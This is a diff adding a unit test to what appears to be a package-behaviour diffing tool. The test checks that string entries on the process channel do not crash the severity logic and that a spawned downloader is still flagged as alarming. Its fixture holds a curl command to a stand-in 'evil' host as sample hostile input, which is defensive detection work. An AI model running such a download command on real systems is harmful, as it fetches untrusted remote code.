@@ -94,6 +94,17 @@ it('treats spawning a downloader as alarming', () => {
   assert.equal(d.severity, 'alarming');
 });
 
+it('a bare-string proc entry is read, not a crash — and a real spawn beside it is still caught', () => {
+  // The probe pushes strings onto the proc channel (e.g. 'read shifted clock'), and diff/severityOf
+  // are exported as pure functions others call directly, so they must key and judge that shape
+  // rather than assume every entry has .argv. Both severityOf (partial input) and the whole diff.
+  assert.doesNotThrow(() => severityOf({ proc: { added: ['read shifted clock'], removed: [] } }));
+  const t = (v, proc) => ({ pkg: 'p', version: v, strategy: 'ebpf', canSee: [], timing: { importMs: 1 }, net: [], dns: [], fs: [], env: [], exec: [], proc });
+  const d = diff(t('1.0.0', []), t('1.0.1', ['read shifted clock', { argv: ['curl', 'http://evil/x'] }]));
+  assert.equal(d.severity, 'alarming', 'a real downloader spawn beside a string entry must still be caught');
+  assert.match(d.reasons.join(' '), /shell or a downloader/);
+});
+
 it('does not cry wolf over an ordinary new file write', () => {
   const d = diff(make('2.4.1'), make('2.4.2', { fs: [{ path: '/app/dist/index.js', op: 'write' }] }));
   assert.equal(d.severity, 'minor');
